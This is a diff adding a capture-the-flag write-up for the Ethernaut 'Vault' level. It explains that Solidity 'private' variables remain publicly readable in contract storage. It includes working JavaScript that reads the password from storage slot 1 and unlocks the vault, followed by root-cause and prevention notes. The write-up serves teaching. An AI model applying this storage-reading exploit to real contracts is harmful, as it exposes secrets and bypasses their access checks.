@@ -357,4 +357,138 @@ fallback() external payable {
 
 So if we call Delegation with `pwn()` data, but Delegation has no function named `pwn`, `fallback()` will execute.
 
-#### 2️⃣ What `
+## 🪙 Level 8: Vault
+
+### Overview
+
+This challenge demonstrates a fundamental misconception about privacy in Ethereum smart contracts. The `private` keyword in Solidity only restricts access from other contracts during execution—it does not hide data from off-chain observers.
+
+All contract storage is publicly readable on the blockchain, making "private" variables accessible to anyone who knows how to read storage slots.
+
+**Goal:** Unlock the vault by setting `locked = false`.
+
+---
+
+### 🔍 Vulnerability Analysis
+
+- **Misunderstanding of `private` Visibility:**
+  - The `password` variable is marked as `private`, but this only prevents other contracts from accessing it during execution.
+  - All storage data remains publicly readable on the blockchain.
+- **No Encryption:**
+  - The password is stored as plain text in storage, not encrypted.
+- **Predictable Storage Layout:**
+  - Solidity stores variables sequentially in storage slots, making it easy to determine which slot contains the password.
+
+---
+
+### 🛠️ Exploitation Steps
+
+1. **Understand Storage Layout**
+   
+   The contract stores variables in this order:
+   - Slot 0: `bool public locked`
+   - Slot 1: `bytes32 private password`
+
+2. **Read the Password from Storage**
+   
+   Use `web3.eth.getStorageAt()` to read the password from slot 1:
+   
+   ```js
+   const password = await web3.eth.getStorageAt(instance, 1);
+   console.log("Password:", password);
+   ```
+
+3. **Unlock the Vault**
+   
+   Call the `unlock()` function with the retrieved password:
+   
+   ```js
+   await contract.unlock(password);
+   ```
+
+4. **Verify Success**
+   
+   Check that the vault is now unlocked:
+   
+   ```js
+   const locked = await contract.locked();
+   console.log("Vault locked:", locked); // should be false
+   ```
+
+---
+
+### 📚 Detailed Explanation
+
+#### Storage Visibility in Ethereum
+
+In Ethereum, all contract storage is publicly readable. The `private` keyword in Solidity only affects:
+- **Compile-time access:** Other contracts cannot directly reference private variables
+- **Runtime access:** Private variables cannot be accessed by other contracts during execution
+
+However, **off-chain observers can always read any storage slot** using:
+- Block explorers
+- RPC calls like `eth_getStorageAt`
+- Web3 libraries
+
+#### Storage Layout
+
+Solidity stores variables sequentially in 32-byte storage slots:
+```solidity
+contract Vault {
+    bool public locked;          // Slot 0 (32 bytes, but bool only uses 1 byte)
+    bytes32 private password;    // Slot 1 (32 bytes)
+}
+```
+
+Since `bool` variables only use 1 byte, the remaining 31 bytes in slot 0 are unused but still part of the slot.
+
+---
+
+### 🪲 Root Cause
+
+The vulnerability stems from the misconception that `private` variables are hidden from off-chain observers. In reality, Ethereum's transparency means all data is publicly accessible.
+
+> **Key takeaway:** `private` in Solidity ≠ private in traditional programming. It only restricts contract-to-contract access, not blockchain visibility.
+
+---
+
+### 🛡️ Prevention
+
+- **Never store sensitive data in plain text** on the blockchain
+- **Use encryption** for sensitive data if it must be stored
+- **Implement access control** rather than relying on visibility modifiers
+- **Consider off-chain storage** for truly sensitive information
+- **Educate developers** about blockchain transparency
+
+---
+
+### 🧪 Complete Exploit Code
+
+```js
+// 1) Read the password from storage slot 1
+const password = await web3.eth.getStorageAt(instance, 1);
+console.log("Retrieved password:", password);
+
+// 2) Unlock the vault using the password
+await contract.unlock(password);
+
+// 3) Verify the vault is unlocked
+const locked = await contract.locked();
+console.log("Vault locked:", locked);
+
+// 4) Confirm success
+if (!locked) {
+    console.log("✅ Vault successfully unlocked!");
+} else {
+    console.log("❌ Vault still locked");
+}
+```
+
+---
+
+### 🔗 Related Concepts
+
+- **Storage Layout:** Understanding how Solidity organizes contract storage
+- **Blockchain Transparency:** Why all on-chain data is public
+- **Access Control:** Proper ways to restrict functionality
+- **Data Privacy:** Strategies for handling sensitive information on public blockchains
